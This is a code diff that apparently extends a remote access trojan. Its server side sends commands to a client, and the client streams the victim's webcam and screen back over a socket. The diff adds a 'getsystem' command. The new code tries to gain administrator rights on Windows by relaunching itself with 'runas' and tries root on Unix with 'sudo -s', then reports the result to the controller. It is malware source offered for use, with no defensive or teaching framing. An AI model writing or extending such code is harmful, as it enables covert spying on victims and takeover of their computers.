@@ -80,6 +80,9 @@ def handle_client(client_socket, addr):
             print(Fore.RED + "[ * ] Server stopped.")
             continue
         
+        if command == "getsystem":
+            print(Fore.YELLOW + "[ * ] Attempting to escalate privileges...")
+        
         client_socket.send(command.encode('utf-8'))
         if command.startswith("webcam_stream") or command.startswith("screen_stream"):
             mode = command.split('_')[0]
@@ -114,6 +117,21 @@ import socket
 import cv2
 import pyautogui
 import numpy as np
+import os
+import ctypes
+
+def escalate_privileges():
+    try:
+        # Attempt to gain administrative privileges on Windows
+        if os.name == 'nt':
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        # Attempt to gain root privileges on Unix-like systems
+        elif os.name == 'posix':
+            os.system('sudo -s')
+        return True
+    except Exception as e:
+        print(f"Failed to escalate privileges: {e}")
+        return False
 
 def webcam_stream(client_socket):
     cap = cv2.VideoCapture(0)
@@ -142,6 +160,11 @@ def main():
             webcam_stream(client_socket)
         elif command == "screen_stream":
             screen_stream(client_socket)
+        elif command == "getsystem":
+            if escalate_privileges():
+                client_socket.send("Privileges escalated".encode('utf-8'))
+            else:
+                client_socket.send("Failed to escalate privileges".encode('utf-8'))
 
 if __name__ == "__main__":
     main()
